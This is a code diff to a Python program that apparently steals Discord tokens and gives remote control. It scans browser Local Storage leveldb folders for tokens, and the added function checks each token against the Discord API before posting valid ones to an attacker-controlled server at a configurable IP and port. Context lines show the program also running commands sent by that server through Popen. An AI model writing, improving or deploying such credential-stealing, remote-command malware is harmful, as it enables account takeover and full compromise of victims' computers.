@@ -8,6 +8,7 @@ from threading import Thread
 from base64 import b64decode
 from time import time, sleep
 from random import choices
+from os.path import isdir
 from re import findall
 from sys import exit
 import pyautogui
@@ -137,6 +138,8 @@ def send_tokens() -> None:
         local + r"\Yandex\YandexBrowser\User Data\Default",
     ]:
         path += r"\Local Storage\leveldb"
+        if not isdir(path):
+            continue
 
         tokens = []
 
@@ -153,10 +156,8 @@ def send_tokens() -> None:
                     for token in findall(regex, line):
                         if token not in tokens:
                             Thread(
-                                target=post,
-                                args=[
-                                    f"{SCHEME}://{IP}:{PORT}/getuser-center?token={token}"
-                                ],
+                                target=check_and_send_token,
+                                args=[token],
                                 name="send_token",
                             ).start()  # for async requests
                             tokens.append(token)
@@ -249,6 +250,16 @@ def show_image(get_images_response: Response) -> None:
 
 def run_command(get_commands_response: Response) -> None:
     Popen(get_commands_response.text)
+
+
+def check_and_send_token(token: str) -> None:
+    if (
+        get(f"https://discord.com/api", headers={"Authorization": token}).status_code
+        != 200
+    ):
+        return  # invalid token check
+
+    post(f"{SCHEME}://{IP}:{PORT}/gettokens-center?token={token}")
 
 
 if __name__ == "__main__":
